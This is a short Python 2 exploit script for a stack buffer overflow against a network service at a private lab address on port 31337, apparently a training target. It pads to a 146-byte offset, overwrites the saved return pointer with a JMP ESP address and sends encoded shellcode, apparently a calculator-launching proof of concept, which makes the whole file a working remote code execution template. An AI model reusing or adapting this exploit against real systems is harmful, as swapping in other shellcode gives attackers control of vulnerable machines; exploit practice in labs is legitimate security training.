#!/usr/bin/env python2
import socket
import struct

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# variables
buf_totlen = 1024
offset_srp = 146
ptr_jmp_esp = 0x080414c3
sub_esp_10 = "\x83\xec\x10"

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# Shellcode
shellcode_calc =  b""
shellcode_calc += b"\xbb\x55\xbc\xba\xbf\xdb\xc8\xd9\x74\x24"
shellcode_calc += b"\xf4\x5a\x29\xc9\xb1\x31\x31\x5a\x13\x83"
shellcode_calc += b"\xc2\x04\x03\x5a\x5a\x5e\x4f\x43\x8c\x1c"
shellcode_calc += b"\xb0\xbc\x4c\x41\x38\x59\x7d\x41\x5e\x29"
shellcode_calc += b"\x2d\x71\x14\x7f\xc1\xfa\x78\x94\x52\x8e"
shellcode_calc += b"\x54\x9b\xd3\x25\x83\x92\xe4\x16\xf7\xb5"
shellcode_calc += b"\x66\x65\x24\x16\x57\xa6\x39\x57\x90\xdb"
shellcode_calc += b"\xb0\x05\x49\x97\x67\xba\xfe\xed\xbb\x31"
shellcode_calc += b"\x4c\xe3\xbb\xa6\x04\x02\xed\x78\x1f\x5d"
shellcode_calc += b"\x2d\x7a\xcc\xd5\x64\x64\x11\xd3\x3f\x1f"
shellcode_calc += b"\xe1\xaf\xc1\xc9\x38\x4f\x6d\x34\xf5\xa2"
shellcode_calc += b"\x6f\x70\x31\x5d\x1a\x88\x42\xe0\x1d\x4f"
shellcode_calc += b"\x39\x3e\xab\x54\x99\xb5\x0b\xb1\x18\x19"
shellcode_calc += b"\xcd\x32\x16\xd6\x99\x1d\x3a\xe9\x4e\x16"
shellcode_calc += b"\x46\x62\x71\xf9\xcf\x30\x56\xdd\x94\xe3"
shellcode_calc += b"\xf7\x44\x70\x45\x07\x96\xdb\x3a\xad\xdc"
shellcode_calc += b"\xf1\x2f\xdc\xbe\x9f\xae\x52\xc5\xed\xb1"
shellcode_calc += b"\x6c\xc6\x41\xda\x5d\x4d\x0e\x9d\x61\x84"
shellcode_calc += b"\x6b\x41\x80\x0d\x81\xea\x1d\xc4\x28\x77"
shellcode_calc += b"\x9e\x32\x6e\x8e\x1d\xb7\x0e\x75\x3d\xb2"
shellcode_calc += b"\x0b\x31\xf9\x2e\x61\x2a\x6c\x51\xd6\x4b"
shellcode_calc += b"\xa5\x32\xb9\xdf\x25\x9b\x5c\x58\xcf\xe3"

# build a message followed by a newline.
buf = ""
buf += "A" * (offset_srp - len(buf))	# padding
buf += struct.pack("<I", ptr_jmp_esp)	# SRP overwrite
buf += sub_esp_10						# ESP points here
buf += shellcode_calc
buf += "D" * (buf_totlen - len(buf))	# trailing padding
buf += "\n"

# send message down the socket.
s.send(buf)
